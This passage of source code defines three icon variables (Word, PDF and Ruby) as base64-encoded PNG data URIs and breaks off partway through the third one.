            word_icon = "data:image/png;base64,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",
            pdf_icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAABztJREFUeF7tm3twTFccx7/nnF15EhH1iFKG1nhPSRGJR9RgSKsYNJ6toVUM0w5havqHV1Wn2qFaMzWmmqLepaoeoxoliqLe9YpnN4nxyCKPze6953TOXUk2Nrv3kl3JRn5/ZXLOPb/f73PO+f1+59y7BM+5kOfcfzwRgJtDYkNYHo0hIPWeFbgH+Q8PNt970uIvfYYAiCFDWJYta5bgYhohqO4vY0ob96rVmhsRHNSy1Z5jN/yhVxeAAEhWYvwaAG/7wwC9MS/czUY1RvwGQRdARmLcCAKySs9Qf7VLAFL8BUEXQGZi/J8AuvrLQb1xCwH4C4IugIz+cTmEkDA9Q/3V7grACYHmhYWGtG63+8hVX+jUBZCZGC98oehpx3gcgK8hBCQAX0IIWAC+ghDQAHwBIeABlBVCxQdwLxswEIarMZobEVztiSvGCg/gqvU+7Co3lESeBkKFB3AnLx93822GADzaDk+0Eio8AFUI3LA+gJ0bWwVPCqHCA5AOOVQOS04uChTF5yshIABIr2UczLXbkedQoHADURFAEKPXWu891sQbtYABYHjqH+tY/9cDXn2sAqBHtrwPQ3r26bVXrYCqLVAVA6qCYFUa9EKgKg3qpZGqNFjOl6J6EyTbSXh10FHvAyYzxIm/wffvKXqs8tcBlIJNmw3atj3E+dNQFn4COBzPDwA2egJo7zcgLDehzp0O0i4GIssCkX5Rg1CpVwAbmAQ6eCRgzYaasgy070CQV1pAXfIp+JG0yg2A9uoH9s4kQHCIG9dAGjWW0QD89x1Q130P5OdVXgC0UzzYpBkApcUx8lYmlBVLIM6dKhE3K90WoK91cTpvMhU5yo8ehLpsEVDgfndYqQDQmC5gkx9zPnUX1BVLta1QmlQaALRrL7BxUwDGSs784gUena80WYD2GwSWNBYgxZW7uH0LyqzJQJ4z2HmSwF4BhIAOHA42aLibf8qi2RD/HNEtFAMXgKzwxk4G7dHHzUl+8SzUOcm6zgfuFqgZCdPEZJCWbUt1Uv36M/DD+58xgBoRgM0G2AsMKX7aTrRNe7D3PgQiazmDm3wtFhpaPFyBDY4JwwGHMTt8tgVI+85gw8ZAXb4Y4vL5p/XP43MkLBx02LugCX20YCdycyB2btFigGvBw08fhyoPPAbFZwBoxziwKR9rs8L3/AZ161qtBi+zMAYa3wts2GigRk1tOHH+DNRlX4BNnAbSvHUJFXzbRmepa1B8BgBBQaDde4O9lQTI7eAoAN+7C+rubcCtDIPmuHQzm0E7dQMdMAykfgOn44oDfNNq8O2bQDt0Bps6y21cdf0P4L+sN6zPdwAKVYaGgiUO0Y6gCA4BhIA4exL8jx3gJ46WWo4WWStnu2lzkJhY0PieRTOuOX/8ENR1KRCW61qZa164DKgb7Z4BVi2HunNLOQJ4pJqE1wAZMBSsz4DiPco5ROZNiCuXAKu12MhaUSAvvgQS3RAwm4v/r6qQdTzfsaVEXNHq/VJmXz6orvwWfM/2Zw+AvNwCTJ69ZUSOiHTOvowBERGQMAyLdDr9AnAkDfzwAYjsO26PsulzQNt1KHVIvnk11M3y02Vj4rMtUBQEC/UK+Rm1l0tleU7/7wYgo/ntLO1vce2yc6YLPKcwUisKpsUrAeJy1HXxle/bBXX5EmPe+/RGqE49kAaNIK6mAw+tgKoC5iAgJBikRiTQqDFIk2agHeNBol5wBjXLdfBtG8DT9nk9sLh6owXa8VM9OshPHYf6eTmkQcPICdUuKGX+Js2aa49Jo/k3C7Xcrifsg2mgcQmeu93PhmPyKC34GhGfbQEjykr0kSC69QIbMV6LG3I1KAtm6dYO5qUpQM0or+qUGROd2cKAlB+AR8aRho3BkmeDRNaGyLRAmT/DIwQSGgbTd/o5nm/8EeqWtQbcryC3wqR2HZhmf6llD3ldrcxLLnF3X+gJadwUpnn6AU5k3ISSPCFwAEhLSYs2MM2cr93oqFvXgW9IcXPALdN4cVGZN1N7EaInZd4Clv5xgnpLd3oWuLSz4WNB+w0G7HY4PhoHWO+WeFpWl/JFhxGRlaPy5VyvXbkQaLA9rWzfB1zp21mEuNzAGjHOUx9ZMJm+WgGEhEL9+SfwTSV/ikTfHAo2dIwxFUJAmTMd4tK/HvvLT+qa7jpUNgDHerzKo8PDdF+jG7MaoK/3A2nZTnt99fg2kFuAdOpmdCiI6+leD0aWnBwRk3qi9IqqMEjraUuNbZkVHR5et3pQNb2uFar9gd2OjIe5mQl/nXU/UblYqjuzqZ1arSEUSZGhwYgKDoav4oG/aMl9fy/fhrs2GwTI6oSDZ0Z606ULYF9smzYC/Kj8wRYBQbCZweShTveXU0bHVQSHzaFCyA9rBQo4Ex16pp07WyYA8uHU2FZJAFZKCEaNKdd+AgUEZEz3Q2fW6dmhuwIKB3i0EmYKIIEA9fUGLo92AWSCkL2C8AV6M19o3/99vk5u5vfAZgAAAABJRU5ErkJggg==",
            ruby_icon = "data:image/png;base64,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